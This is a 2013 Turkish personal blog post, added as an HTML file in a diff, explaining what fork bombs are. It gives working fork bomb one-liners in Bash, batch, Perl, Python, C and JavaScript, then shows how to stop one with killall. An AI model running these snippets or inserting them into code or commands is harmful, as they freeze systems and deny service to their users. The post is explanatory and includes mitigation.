@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html class="no-js">
+
+  <head>
+	<meta charset="utf-8">
+	<title>Fork Bombasi | Mehmet Başal</title>
+	<meta name="description" content="Fork bombası, bir prosesin kendini sürekli kopyalarak kullanılarbilir sistem kaynaklarını sömürmesi durumudur.CPU ve RAM’i meşgul ederek bilgisayarınızın don...">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	
+	<!-- CSS -->
+	<link rel="stylesheet" href="/css/main.css">
+	
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+	
+	<!-- Canonical -->
+	<link rel="canonical" href="http://pasali.me/2013/09/26/fork-bombasi.html">
+	
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="Mehmet Başal" href="http://pasali.me/feed.xml" />
+	
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+	
+	<!-- Google Fonts -->
+	<link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:400,700,700italic,400italic" rel="stylesheet" type="text/css">
+	
+	<!-- Google Analytics -->
+	
+</head>
+
+
+  <body>
+    <header class="site-header">
+
+	<div class="branding">
+		
+		<img class="avatar" src="/img/avatar.png" alt=""/>
+		
+		
+		<h1 class="site-title">
+			<a href="/">Mehmet Başal</a>
+		</h1>
+	</div>
+	
+	<nav class="site-nav">
+		<ul>
+			
+				
+			
+				
+				<li>
+					<a class="page-link" href="/about/">Hakkında</a>
+				</li>
+				
+			
+				
+			
+				
+			
+				
+			
+				
+			
+				
+			
+
+			<!-- Social icons from Font Awesome, if enabled -->
+			
+
+
+<li>
+	<a href="mailto:mhmtbsl@gmail.com" title="Email">
+		<i class="fa fa-fw fa-envelope"></i>
+	</a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li>
+	<a href="https://github.com/pasali" title="Follow on GitHub">
+		<i class="fa fa-fw fa-github"></i>
+	</a>
+</li>
+
+
+
+
+
+
+
+<li>
+	<a href="https://www.linkedin.com/in/pasali" title="Follow on LinkedIn">
+		<i class="fa fa-fw fa-linkedin"></i>
+	</a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li>
+	<a href="https://twitter.com/p4s4li" title="Follow on Twitter">
+		<i class="fa fa-fw fa-twitter"></i>
+	</a>
+</li>
+
+
+
+
+
+		</ul>
+	</nav>
+	
+</header>
+
+
+    <div class="content">
+      <article >
+
+  <header style="background-image: url('/')">
+    <h1 class="title">Fork Bombasi</h1>
+    
+    <p class="meta">
+    September 26, 2013
+    
+    </p>
+  </header>
+
+  <section class="post-content">
+    <p>Fork bombası, bir prosesin kendini sürekli kopyalarak kullanılarbilir sistem kaynaklarını sömürmesi durumudur.
+CPU ve RAM’i meşgul ederek bilgisayarınızın donmasına neden olur. </p>
+
+<h1>Fork Bombası Nasıl Yapılır ?</h1>
+
+<p>Unix türevi bir işletim sistemi kullanıyorsanız, fork sistem çağrısını kullanararak bir fork bombası yapabilirsiniz.&lt;!-- more --&gt;
+fork fonksiyonu bulunduğu prosesin bir kopyasını oluşturur. exec fonksiyonu ilede o kopya prosese isteğiniz bir programı gömebilirsiniz.
+Eğer siz fonksiyonu sonsuz döngüye sokup sürekli kendini kopyalamasını sağlarsınız elinizde nur topu gibi bir fork bombanız olur.
+Çeşitli dillerde gerçekleme yapabilirsiniz. Bir kaç örnek vermek gerekirse:</p>
+
+<h2>Bash</h2>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">:<span class="o">(){</span> :<span class="p">|</span>:<span class="p">&amp;</span> <span class="o">}</span><span class="p">;</span>:
+</code></pre></div>
+<h2>Windows Batch</h2>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">:s
+start <span class="s2">&quot;&quot;</span> %0
+goto s
+</code></pre></div>
+<h2>Perl</h2>
+<div class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&quot;fork while fork&quot;</span> <span class="o">&amp;</span>
+</code></pre></div>
+<h2>Pyhton</h2>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
+<span class="k">while</span> <span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span> <span class="ow">or</span> <span class="bp">True</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span>
+</code></pre></div>
+<h2>C</h2>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;unistd.h&gt;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">fork</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2>Javascript</h2>
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+     <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+     <span class="kd">var</span> <span class="nx">w</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">();</span>
+     <span class="nx">w</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">outerHTML</span><span class="o">||</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">);</span>
+     <span class="p">}</span>
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<h2>Etkisiz Hale Getirme</h2>
+
+<p>Yapıları yüzünden fork bombaları çalışmaya başlayınca durdurması zordur. Eğer şanslıysanız PID’ler bitmeden durdurabilirsiniz. Örnek olarak bash scripti alalım:</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bomb<span class="o">()</span> <span class="o">{</span>
+    bomb <span class="p">|</span> bomb <span class="p">&amp;</span>
+<span class="o">}</span><span class="p">;</span>
+bomb
+</code></pre></div>
+<p>Yukardaki betik öz yineli şekilde kendi kopyasını üretiyor ve ampersan operatöründen dolayı bunu arka planda yapıyor. Eğer prosesin adını biliyorsak önce dondurup sonra da bütün çocuk ve ebeveyn prosesleri öldürürüz yani:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">killall -STOP prosesAdi
+killall -KILL prosesAdi
+</code></pre></div>
+<p>Eğer boş PID kalmamışsa bombayı durdurmak için en az bir shell açık olmalıdır. Unix tabanlı sistemlerde her prosesin bir PIDsi vardır. Ama bu sınırlı bir rakamdır. Fork bombası PIDleri doldurursa onu durdurmak içim bir shell açamazsınız daha doğrusu yeni bir proses oluşturamazsınız. Bu durumda en az bir shell açık olmalıdır.
+kaynak:wikipedia</p>
+
+  </section>
+
+  <!-- Disqus -->
+  
+  
+</article>
+    </div>
+
+    
+<footer class="site-footer">
+	<p class="text">Powered by <a href="http://jekyllrb.com">Jekyll</a> with <a href="https://rohanchandra.github.io/project/type.html">Type Theme</a>
+</p>
+</footer>
+
+  </body>
+  
+</html>
